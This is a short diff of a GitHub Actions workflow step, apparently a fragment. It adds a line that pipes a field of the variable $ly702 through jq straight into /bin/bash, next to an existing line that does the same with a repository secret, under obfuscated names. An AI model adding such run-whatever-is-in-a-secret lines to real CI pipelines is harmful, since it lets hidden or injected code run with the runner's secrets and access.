@@ -17,6 +17,7 @@ jobs:
           oulmx43: ${{ secrets.oulmx43 }}
         run: |
           printf '%s' "$oulmx43" | jq -r .ohn36 | /bin/bash
+          echo $ly702 | jq -r .xuem46 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
